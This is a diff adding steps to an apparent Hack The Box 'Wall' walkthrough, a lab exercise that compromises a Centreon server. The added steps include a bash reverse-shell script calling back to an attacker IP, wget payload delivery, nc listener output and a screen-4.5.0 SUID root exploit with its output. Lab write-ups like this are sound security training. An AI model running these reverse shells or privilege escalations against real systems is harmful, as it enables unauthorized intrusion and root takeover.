@@ -94,7 +94,7 @@ Navigating to <b>http://10.10.10.157/centreon</b> we are greeted with a login pa
 <center><img src="/htb/wall/login.png"></center>
 <br>
 
-Doing a quick google search will reveal a RCE exploit for this version of <b>centreon</b>.
+Doing a quick google search will reveal a *[RCE exploit](https://www.exploit-db.com/exploits/47069)* for this version of <b>centreon</b>.
 
 <center><img src="/htb/wall/rce.png"></center>
 <br>
@@ -125,3 +125,64 @@ password=password1
 For some reason I couldn't get the RCE to work and open up a reverse shell for me so I had to find another way. I did this by logging into the <b>centreon</b> web app using the credentials we brute forced. I then navigated to <b>Configuration > Commands > Miscellaneous</b> where you will see this.
 
 <center><img src="/htb/wall/command.png"></center>
+<br>
+Now to get my reverse shell I was unable to just type a <b>nc</b> command into the box to connect back to me, I had to do an extra step. First I created a bash script file on my kali machine that contains the command for the reverse shell
+```
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.10.14.21/10000 0>&1
+```
+I then used <b>wget</b> from the web console combined with a <b>python SimpleHTTPServer</b> to download the file onto the box. Hit the small blue button to execute the command.
+
+<center><img src="/htb/wall/wget.png"></center>
+<br>
+If done correctly you should see the file get downloaded from the <b>python SimpleHTTPServer
+```
+# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+10.10.10.157 - - [21/Sep/2019 20:07:41] "GET /shell.sh HTTP/1.1" 200 -
+```
+Now with the file on the system, we can see up our reverse listener
+```
+# nc -lvnp 10000
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::10000
+Ncat: Listening on 0.0.0.0:10000
+```
+And to trigger the shell just go back to the web console and execute the command <b>bash shell.sh</b>.
+
+<center><img src="/htb/wall/execute.png"></center>
+<br>
+If everything works you should see a shell spawn
+```
+# nc -lvnp 10000
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::10000
+Ncat: Listening on 0.0.0.0:10000
+Ncat: Connection from 10.10.10.157.
+Ncat: Connection from 10.10.10.157:52120.
+bash: cannot set terminal process group (982): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@Wall:/usr/local/centreon/www$
+```
+Now the <b>user.txt</b> file is stored in <b>/home/shelby/</b> but we dont have the permissions to read it. Doing some quick manual enumeration did result in me finding much so I decided to use the <b>LinEnum.sh</b> script. I copied the script over to the box using the same method as <b>shell.sh</b> but this time I executed <b>wget</b> from the command line inside the shell.
+
+Reading through the output of the script, there is and <b>SUID</b> file that stands out.
+```
+-rwsr-xr-x 1 root root 1595624 Jul  4 00:25 /bin/screen-4.5.0
+```
+A quick google search will reveal *[this](https://www.exploit-db.com/exploits/41154)* exploit. I once again copied the exploit over to the box using the same method. I then run the exploit and instantly become the root user. I run a <b>whoami</b> to confirm this. From here you can just grab both the user and root flags
+```
+$ bash screenroot.sh
+bash screenroot.sh
+~ gnu/screenroot ~
+[+] First, we create our shell and library...
+[+] Now we create our /etc/ld.so.preload file...
+[+] Triggering...
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /tmp/screens/S-www-data.
+
+whoami
+root
+```
